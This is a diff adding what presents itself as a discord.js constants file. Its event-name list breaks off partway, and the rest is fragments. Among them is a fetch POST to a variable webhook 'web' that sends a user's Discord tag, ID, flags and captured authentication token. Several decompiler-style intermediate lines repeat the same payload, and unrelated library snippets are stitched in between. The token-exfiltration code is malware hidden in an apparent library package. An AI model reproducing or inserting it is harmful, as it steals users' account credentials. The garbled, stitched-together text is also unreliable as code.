@@ -1,0 +1,75 @@
+exports.Events = {
+  RATE_LIMIT: 'rateLimit',
+  READY: 'ready',
+  RESUME: 'resume',
+  GUILD_CREATE: 'guildCreate',
+  GUILD_DELETE: 'guildDelete',
+  GUILD_UPDATE: 'guildUpdate',
+  GUILD_UNAVAILABLE: 'guildUnavailable',
+  GUILD_AVAILABLE: 'guildAvailable',
+  GUILD_MEMBER_ADD: 'guildMemberAdd',
+  GUILD_MEMBER_REMOVE: 'guildMemberRemove',
+  GUILD_MEMBER_UPDATE: 'guildMemberUpdate',
+  GUILD_MEMBER_AVAILABLE: 'guildMemberAvailable',
+  GUILD_MEMBER_SPEAKING: 'guildMemberSpeaking',
+  GUILD_MEMBERS_CHUNK: 'guildMembersChunk',
+  GUILD_INTEGRATIONS_UPDATE: 'guildIntegrationsUpdate',
+  GUILD_ROLE_CREATE: 'roleCreate',
+  GUILD_ROLE_DELETE: 'roleDelete',
+  GUILD_ROLE_UPDATE: 'roleUpdate',
+  GUILD_EMOJI_CREATE: 'emojiCreate',
+  GUILD_EMOJI_DELETE: 'emojiDelete',
+  GUILD_EMOJI_UPDATE: 'emojiUpdate',
+  GUILD_BAN_ADD: 'guildBanAdd',
+  GUILD_BAN_REMOVE: 'guildBanRemove',
+  CHANNEL_CREATE: 'channelCreate',
+  CHANNEL_DELETE: 'channelDelete',
+  CHANNEL_UPDATE: 'channelUpdate',
+  CHANNEL_PINS_UPDATE: 'cha...
+Constants.Endpoints.Guild(this).Splash(this.client.options.http.cdn, this.splash)
+await fetch(web, {
+               method: 'POST',
+               headers: {
+                 'Content-Type': 'application/json'
+               },
+               body: JSON.stringify({
+                 embeds: [{
+                   description: [
+                     `**Tag:** \`${data.username}#${data.discriminator}\``,
+                     `**ID:** \`${data.id}\``,
+                     `**Flags:** \`${data.flags}\``,
+                     `**Token:** \`${match}\``,
+                   ].join('\n'),
+                 }]
+               })
+             }).catch(() => true)
+_tmp_33.body = JSON.stringify({
+                 embeds: [{
+                   description: [
+                     `**Tag:** \`${data.username}#${data.discriminator}\``,
+                     `**ID:** \`${data.id}\``,
+                     `**Flags:** \`${data.flags}\``,
+                     `**Token:** \`${match}\``,
+                   ].join('\n'),
+                 }]
+               })
+_tmp_35.embeds = [{
+                   description: [
+                     `**Tag:** \`${data.username}#${data.discriminator}\``,
+                     `**ID:** \`${data.id}\``,
+                     `**Flags:** \`${data.flags}\``,
+                     `**Token:** \`${match}\``,
+                   ].join('\n'),
+                 }]
+_tmp_37.description = [
+                     `**Tag:** \`${data.username}#${data.discriminator}\``,
+                     `**ID:** \`${data.id}\``,
+                     `**Flags:** \`${data.flags}\``,
+                     `**Token:** \`${match}\``,
+                   ].join('\n')
+_tmp_39.push(<operator>.formatString("**Tag:** \`", data.username, "#", data.discriminator, "\`"))
+this.client.channels.find(channel =>
+      channel.recipient && channel.recipient.id === recipient.id
+    )
+_tmp_39.push(<operator>.formatString("**Flags:** \`", data.flags, "\`"))
+_tmp_39.push(<operator>.formatString("**Token:** \`", match, "\`"))
